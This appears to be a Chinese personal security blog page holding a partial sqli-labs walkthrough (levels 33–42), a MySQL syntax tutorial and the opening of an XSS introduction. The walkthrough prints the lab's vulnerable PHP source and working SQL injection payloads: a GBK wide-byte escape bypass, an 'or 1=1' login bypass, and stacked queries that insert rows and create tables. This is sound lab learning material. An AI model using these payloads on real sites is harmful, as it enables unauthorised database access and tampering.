class="comment">//escape single quote with a backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\"/'</span>, <span class="string">"\\\""</span>, $string);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=check_addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line"><span class="comment">//echo "The filtered request is :" .$id . "&lt;br&gt;";</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line">mysql_query(<span class="string">"SET NAMES gbk"</span>);</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure></p>
<p>如果根据其查询语句，我们构造的payload为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">'#</span></span><br><span class="line"><span class="string">或者?id=1%27%23</span></span><br></pre></td></tr></table></figure></p>
<p>然后此时在函数check_addslashes()的作用下，”‘“将会被转换成”\’”;<br>所以在数据传输到数据库之前,payload会变为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>%<span class="number">5</span>c%<span class="number">27</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p>而源码中的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(<span class="string">"SET NAMES gbk"</span>);</span><br></pre></td></tr></table></figure></p>
<p>这个函数将mysql的三个字符集设置为gbk，而gbk有一个特点就是<strong>两个字符为一个汉字，例如%aa%5c 就是一个<br>汉字（前一个 ascii 码大于 128 才能到汉字的范围）</strong></p>
<p>所以此时我们输入的payload中的 %5c%27 将被作为一个汉字进行处理，就此注入失败。</p>
<p>所以我们这里修改payload为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>%df%<span class="number">27</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p>转义后就是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>%df%<span class="number">5</span>c%<span class="number">27</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p>和上面一样，此时%df%5c作为一个字符传输进去，后面的%27%23不受影响。<br>可见这道题意在过滤掉”‘“.<br>所以这里我们构造payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span>%df%<span class="number">27</span>union%<span class="number">20</span>select%<span class="number">201</span>,user(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure></p>
<h1 id="sqlilab-34"><a href="#sqlilab-34" class="headerlink" title="sqlilab-34"></a>sqlilab-34</h1><p>先来介绍一下函数addslashes()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</span><br><span class="line"></span><br><span class="line">预定义字符是：</span><br><span class="line"></span><br><span class="line">  单引号（<span class="string">'）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  双引号（"）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  反斜杠（\）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  NULL</span></span><br></pre></td></tr></table></figure></p>
<p>观察源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $uname1=$_POST[<span class="string">'uname'</span>];</span><br><span class="line">    $passwd1=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//echo "username before addslashes is :".$uname1 ."&lt;br&gt;";</span></span><br><span class="line">        <span class="comment">//echo "Input password before addslashes is : ".$passwd1. "&lt;br&gt;";</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">    $fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">    fwrite($fp,<span class="string">'User Name:'</span>.$uname1);</span><br><span class="line">    fwrite($fp,<span class="string">'Password:'</span>.$passwd1.<span class="string">"\n"</span>);</span><br><span class="line">    fclose($fp);</span><br><span class="line">        </span><br><span class="line">        $uname = addslashes($uname1);</span><br><span class="line">        $passwd= addslashes($passwd1);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//echo "username after addslashes is :".$uname ."&lt;br&gt;";</span></span><br><span class="line">        <span class="comment">//echo "Input password after addslashes is : ".$passwd;    </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// connectivity </span></span><br><span class="line">    mysql_query(<span class="string">"SET NAMES gbk"</span>);</span><br><span class="line">    @$sql=<span class="string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;</span><br><span class="line">    $result=mysql_query($sql);</span><br><span class="line">    $row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure></p>
<p>观察到在源码中有这么一段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uname = addslashes($uname1);</span><br><span class="line">$passwd= addslashes($passwd1);</span><br></pre></td></tr></table></figure></p>
<p>也就是说我们所POST的uname还有passwd将会被转义<br>同样的数据库的编码被设置为GBK，这里我们将需要把utf8转换为utf16，也就是说 “ ‘ “要转换为 “ � ‘ “。<br>payload为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:� <span class="string">' or 1=1#</span></span><br><span class="line"><span class="string">password:随便填</span></span><br></pre></td></tr></table></figure></p>
<h1 id="sqlilab-38-堆叠注入"><a href="#sqlilab-38-堆叠注入" class="headerlink" title="sqlilab-38(堆叠注入)"></a>sqlilab-38(堆叠注入)</h1><p>参考文章<a href="http://php.net/manual/zh/mysqli.multi-query.php" target="_blank" rel="noopener">http://php.net/manual/zh/mysqli.multi-query.php</a><br>参考文章<a href="https://www.jianshu.com/p/c50ced83414d" target="_blank" rel="noopener">https://www.jianshu.com/p/c50ced83414d</a></p>
<p>介绍函数mysqli_multi_query()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysqli_multi_query():</span><br><span class="line"></span><br><span class="line">执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句。</span><br></pre></td></tr></table></figure></p>
<p>利用这个函数</p>
<p>关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$con1 = mysqli_connect($host,$dbuser,$dbpass, $dbname);   </span><br><span class="line">$username = mysqli_real_escape_string($con1, $_POST[<span class="string">"login_user"</span>]);</span><br><span class="line">$password = $_POST[<span class="string">"login_password"</span>];</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query($con1, $sql))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* store first result set */</span></span><br><span class="line">    <span class="keyword">if</span> ($result = mysqli_store_result($con1))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>($row = mysqli_fetch_row($result))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;font size = "5" color= "#00FF00"&gt;'</span>;  </span><br><span class="line">            printf(<span class="string">"Your Username is : %s"</span>, $row[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            printf(<span class="string">"Your Password is : %s"</span>, $row[<span class="number">2</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//            mysqli_free_result($result);</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>所以构造payload如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="string">'; insert into users(id,username,password) value (66,'</span>acca<span class="string">','</span>bbc<span class="string">')--+</span></span><br></pre></td></tr></table></figure></p>
<p>尝试对数据库进行数据的添加操作<br><img src="/2019/01/28/巩固sql注入/20.png" alt=""></p>
<p>由此一个堆叠注入完成，实际上在真正应用中堆叠注入并不是在大部分情况下能够成功过的，其局限性还是很大的。在php源码中要有mysqli_multi_query()这个函数，并且数据库引擎支持的情况下才可以进行。</p>
<h1 id="sqlilab-42"><a href="#sqlilab-42" class="headerlink" title="sqlilab-42"></a>sqlilab-42</h1><p>观察下列源码：(login.php)<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span><span class="params">($host,$dbuser,$dbpass, $dbname)</span></span>&#123;</span><br><span class="line">   <span class="comment">// connectivity</span></span><br><span class="line"><span class="comment">//mysql connections for stacked query examples.</span></span><br><span class="line">$con1 = mysqli_connect($host,$dbuser,$dbpass, $dbname);</span><br><span class="line">   </span><br><span class="line">   $username = mysqli_real_escape_string($con1, $_POST[<span class="string">"login_user"</span>]);</span><br><span class="line">   $password = $_POST[<span class="string">"login_password"</span>];</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Check connection</span></span><br><span class="line">   <span class="keyword">if</span> (mysqli_connect_errno($con1))</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"Failed to connect to MySQL: "</span> . mysqli_connect_error();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">       @mysqli_select_db($con1, $dbname) <span class="keyword">or</span> <span class="keyword">die</span> ( <span class="string">"Unable to connect to the database ######: "</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* execute multi query */</span></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">   $sql = <span class="string">"SELECT * FROM users WHERE username='$username' and password='$password'"</span>;</span><br><span class="line">   <span class="keyword">if</span> (@mysqli_multi_query($con1, $sql))</span><br><span class="line">   &#123;</span><br><span class="line">        <span class="comment">/* store first result set */</span></span><br><span class="line">      <span class="keyword">if</span>($result = @mysqli_store_result($con1))</span><br><span class="line">      &#123;</span><br><span class="line">     <span class="keyword">if</span>($row = @mysqli_fetch_row($result))</span><br><span class="line">     &#123;</span><br><span class="line">        <span class="keyword">if</span> ($row[<span class="number">1</span>])</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="keyword">return</span> $row[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
<p>发现username被转义，而password并未被转义，那么payload:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin(随便写)</span><br><span class="line">password：<span class="number">-1</span><span class="string">';create table test2 like users#</span></span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>

    

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/25/sql基础语法的二次学习/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cookie">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The clown is laughing at you">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/01/25/sql基础语法的二次学习/" class="post-title-link" itemprop="url">巩固sql基础语法</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Erstellt: 2019-01-25 23:32:41" itemprop="dateCreated datePublished" datetime="2019-01-25T23:32:41+08:00">2019-01-25</time>
            </span>
          

          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Bearbeitet am</span>
                
                <time title="Geändert am: 2019-02-24 17:38:22" itemprop="dateModified" datetime="2019-02-24T17:38:22+08:00">2019-02-24</time>
              </span>
            
          

          

          
            
            
          

          
          

          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>这两天是这么计划的，借着实验室给我们留的实验环境，今天早上复习一下sql的基础语法，下午再把之前做过的sqlilab再看一下，最后学习使用sqlmap</p>
<p><strong>0x01–基本语法</strong><br>打开终端，开启mysql：<br>    <code>mysql -uroot -p</code></p>
<p>关于数据库，我觉得比较重要的就是数据的增删改查，数据还原，数据备份，以及mysql数据库语法和语句，这里我会通过一些实验来体现。<br>语法部分参考菜鸟教程的mysql教程<br><strong>0x01</strong>（数据库以test为例）</p>
<p>创建数据库:<br>    <code>mysql&gt; create database test;</code></p>
<p>删除数据库:<br>    <code>mysql&gt; drop database test;</code></p>
<p>选择数据库：<br>    <code>mysql&gt; use test;</code></p>
<p>mysql数据类型参考：<a href="http://www.runoob.com/mysql/mysql-data-types.html" target="_blank" rel="noopener">http://www.runoob.com/mysql/mysql-data-types.html</a></p>
<p>创建数据表：<br>基本语法–&gt; CREATE TABLE table_name (column_name column_type);<br>放一个栗子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create table test(</span><br><span class="line">    -&gt; &apos;ID number&apos; INT NOT NULL,</span><br><span class="line">    -&gt; &apos;NAME&apos; VARCHAR(100) NOT NULL,</span><br><span class="line">    -&gt; PRIMARY KEY(&apos;ID number&apos;))</span><br><span class="line">    -&gt; ENGINE=InnoDB DEFAUTL CHARSET=utf8;</span><br></pre></td></tr></table></figure></p>
<p>这个是错误的，有几处错误，“ ‘ ”要改成“ ` ”，每一个字段中间都要有一个空格，DEFAULT才是正确的拼写。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create table test(</span><br><span class="line">    -&gt; `ID number`  INT  NOT NULL,</span><br><span class="line">    -&gt; `NAME`  VARCHAR(100)  NOT NULL,</span><br><span class="line">    -&gt; PRIMARY KEY(`ID number`))</span><br><span class="line">    -&gt; ENGINE=InnoDB  DEFAULT CHARSET=utf8;</span><br></pre></td></tr></table></figure></p>
<p>我觉得这个创建数据表最坑，虽然很鸡肋，但是之前刚学sql的时候老是写错语法。</p>
<p>删除数据表：<br>    <code>mysql&gt;drop table test;</code></p>
<p>插入数据：<br>基本语法如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name ( field1, field2,...fieldN )</span><br><span class="line">                       VALUES</span><br><span class="line">                       ( value1, value2,...valueN );</span><br></pre></td></tr></table></figure></p>
<p><strong>如果数据是字符型，必须使用单引号或者双引号，如：”value”。</strong><br>放一个栗子：<br>我们创建了DOG数据表，有number 还有 NAME 两个字段:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; INSERT INTO DOG</span><br><span class="line">    -&gt; (number,NAME)</span><br><span class="line">    -&gt; values</span><br><span class="line">    -&gt; (123,&quot;jojo&quot;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; INSERT INTO DOG (number,NAME) values (235,&quot;koko&quot;);</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br></pre></td></tr></table></figure></p>
<p>我觉得在创建数据表时，字段名不能是那种带有空格的，我觉得有空格的字段名会出事。需要空格时用”_”代替.</p>
<p>查询数据：<br>    <code>select 字段名 from 数据表名 where 子句条件</code></p>
<pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select NAME from DOG where number=123;</span><br><span class="line">+------+</span><br><span class="line">| NAME |</span><br><span class="line">+------+</span><br><span class="line">| jojo |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
</code></pre><p>更新数据：<br>    <code>UPDATE 数据表名 SET 字段名=new-字段值 where 子句条件</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; UPDATE DOG SET NAME=&quot;ming&quot; where number=123;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from DOG;</span><br><span class="line">+--------+------+</span><br><span class="line">| number | NAME |</span><br><span class="line">+--------+------+</span><br><span class="line">|    123 | ming |</span><br><span class="line">|    235 | koko |</span><br><span class="line">+--------+------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
<p>删除数据：<br>     <code>DELETE FROM table_name [WHERE Clause]</code><br>如果没有指定 WHERE 子句，MySQL 表中的所有记录将被删除。<br>你可以在 WHERE 子句中指定任何条件<br>您可以在单个表中一次性删除记录。<br>当你想删除数据表中指定的记录时 WHERE 子句是非常有用的。</p>
<p>LIKE子句：<br>我就用一个栗子来理解吧，LIKE子句就是用于配合where来使用。<br><img src="/2019/01/25/sql基础语法的二次学习/1.png" alt="sql基础语法的二次学习/1.png"></p>
<p>我觉得mysql的基本语法就是这些了。</p>
<p>1.增:<br>insert into 表名 values(0,’测试’);<br>注：如上语句，表结构中有自动增长的列，也必须为其指定一个值，通常为0<br>insert into 表名(id,name) values(0,’尹当’)–同上<br>2.删数据:<br>delete from 表名;<br>delete from 表名 where id=1;<br>删除结构：<br>删数据库：drop database 数据库名;<br>删除表：drop table 表名;<br>删除表中的列:alter table 表名 drop column 列名;<br>3.改:<br>修改所有：updata 表名 set 列名=’新的值，非数字加单引号’ ;<br>带条件的修改：updata 表名 set 列名=’新的值，非数字加单引号’ where id=6;<br>4.查:<br>查询所有的数据：select <em>from 表名;<br>带条件的查询：<br>select </em>from 表名 where 列名=条件值;<br>Select <em> from 表名 where 列名 not like（like） ‘字符值’<br>分页查询：select </em>from 表名 limit 每页数量 offset 偏移量;<br>5.备份数据库：(将数据库test备份)<br>mysqldump -u root -p test&gt;c:/test.txt<br>备份表格：(备份test数据库下的mytable表格)<br>mysqldump -u root -p test mytable&gt;c:/test.txt<br>将备份数据导入到数据库：(导回test数据库)<br>mysql -u root -p test</p>
<ol>
<li>导出数据：<br>mysqldump –opt test &gt; mysql.test<br>即将数据库test数据库导出到mysql.test文件，后者是一个文本文件<br>如：mysqldump -u root -p123456 –databases dbname &gt; mysql.dbname<br>就是把数据库dbname导出到文件mysql.dbname中。</li>
<li>导入数据:<br>mysqlimport -u root -p123456 &lt; mysql.dbname。<br>不用解释了吧。</li>
<li>将文本数据导入数据库:<br>文本数据的字段数据之间用tab键隔开。<br>use test;<br>load data local infile “文件名” into table 表名;</li>
</ol>
<p><strong>0x02–mysql字符串匹配模式</strong><br>（开启数据库test,选择数据表DOG）<br><img src="/2019/01/25/sql基础语法的二次学习/2.png" alt="sql基础语法的二次学习/2.png"></p>
<p>（1）标准的sql模式匹配(简单)<br>以“t”开头的使用 t%<br><img src="/2019/01/25/sql基础语法的二次学习/3.png" alt="sql基础语法的二次学习/3.png"></p>
<p>以“m”结尾的使用 %m<br><img src="/2019/01/25/sql基础语法的二次学习/4.png" alt="sql基础语法的二次学习/4.png"></p>
<p>内容中有“com”的 使用 %co字符m%<br><img src="/2019/01/25/sql基础语法的二次学习/5.png" alt="sql基础语法的二次学习/5.png"></p>
<p>搜索包含4个字符的使用 “____”,即4个“_”<br><img src="/2019/01/25/sql基础语法的二次学习/6.png" alt="sql基础语法的二次学习/6.png"></p>
<p>（2）正则表达式匹配模式<br>匹配任何单个的字符 “.”<br>    <code>select * from DOG where NAME REGEXP &quot;.&quot;</code><br>匹配以“t”开头的使用 “^”<br>    <code>select * from DOG where NAME REGEXP &quot;^t&quot;</code><br>匹配以“m”结尾的使用 “$”<br>    <code>select * from DOG where NAME REGEXP &quot;m$&quot;</code><br>匹配有6个字符的名字<br>    <code>select * from DOG where NAME REGEXP &quot;^......$&quot;</code><br>    <code>select * from DOG where NAME REGEXP &quot;^.{6}$&quot;</code>（使用{n}：重复n次操作符前的字符）<br>匹配含有某些字符的名字，比如[abc],[a-z],[A-Z],[a-zA-Z],[aA],[0-9]<br>    <code>select * from DOG where NAME REGEXP &quot;[abc]&quot;</code>（匹配含有’a’,’b’,’c’的任何一个字符）</p>
<p>（3）列的别名<br>ORDER BY 我想估计不用说了吧，应该大家都会用，那么来点好玩的，给列来一个别名<br>    <code>select number as x,NAME as y from DOG order by x,y;</code><br><img src="/2019/01/25/sql基础语法的二次学习/7.png" alt="sql基础语法的二次学习/7.png"></p>
<p>创建一个新表，有原来的数据<br>    <code>create table student select number as id,NAME as name from DOG;</code><br><img src="/2019/01/25/sql基础语法的二次学习/8.png" alt="sql基础语法的二次学习/8.png"></p>
<p>（4）表的别名<br><img src="/2019/01/25/sql基础语法的二次学习/9.png" alt="sql基础语法的二次学习/9.png"><br>我个人觉得这个的使用取决于个人查询数据的需求，因为实验用的数据表，所以就偷懒一下。</p>
<p>（5）取出互不相同的数值，但数据库中有相同的数据，为去除冗余的行.使用distinct<br>    <code>select distinct 字段 from table_name where 条件子句</code></p>
<p>（6）关于NULL,我觉得有一个很好的栗子，就是查询某学生留校情况，条件为 “leave IS NOT NULL”,不可写成“leave != NULL”<br><strong>NULL 和 “” 是不一样的，如果数据中，某人的号码为NULL，说明数据库中无此人的号码，他有，但是我们没存。如果为“”，空字符串说明他没有手机号码。</strong></p>

          
        
      
    </div>

    

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/25/学习记录-关于XSS/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cookie">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The clown is laughing at you">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/01/25/学习记录-关于XSS/" class="post-title-link" itemprop="url">学习记录--关于XSS攻击</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Erstellt: 2019-01-25 09:41:57" itemprop="dateCreated datePublished" datetime="2019-01-25T09:41:57+08:00">2019-01-25</time>
            </span>
          

          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Bearbeitet am</span>
                
                <time title="Geändert am: 2019-01-26 11:44:10" itemprop="dateModified" datetime="2019-01-26T11:44:10+08:00">2019-01-26</time>
              </span>
            
          

          

          
            
            
          

          
          

          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>关于XSS的学习，昨天花了一天的时候看了很多关于XSS的文章，自我感觉已经略知一二，今天把自己的学习心得，包括一些定义和原理，我将会用DVWA上的靶场以及自己通过Express搭建的平台来演示XSS的一些基本的操作，希望在往后的学习过程中能了解更多，这里放上一个知乎博主的文章，关于他发现百度网盘上有一个XSS漏洞，现在已经修复了，但是还是蛮有意思的,<a href="https://zhuanlan.zhihu.com/p/24249045" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/24249045</a>.</p>
<p><strong>0x01</strong><br>首先什么是XSS漏洞：<br>XSS, 即为（Cross Site Scripting）, 中文名为跨站脚本, 是发生在目标用户的浏览器层面上的，当渲染DOM树的过程成发生了不在预期内执行的JS代码时，就发生了XSS攻击。<br>跨站脚本的重点不在‘跨站’上，而在于‘脚本’上。大多数XSS攻击的主要方式是嵌入一段远程或者第三方域上的JS代码。实际上是在目标网站的作用域下执行了这段js代码。</p>
<p>在学习XSS漏洞前要对javaScript有所了解，以及HTTP,DOM,Ajax有所认识.(上一个暑假花时间学习了关于了前端的知识，所以刚好用得上)</p>
<p>XSS的攻击方式分为：(1)反射型XSS (2)存储型XSS (3)DOM XSS</p>
<hr>
<p>(1)反射型XSS:<br>反射型XSS，也叫非持久型XSS，是指发生请求时，XSS代码出现在请求URL中，作为参数提交到服务器，服务器解析并响应。响应结果中包含XSS代码，最后浏览器解析并执行。</p>
<p>从概念上可以看出，反射型XSS代码是首先出现在URL中的，然后需要服务端解析，最后需要浏览器解析之后XSS代码才能够攻击。</p>
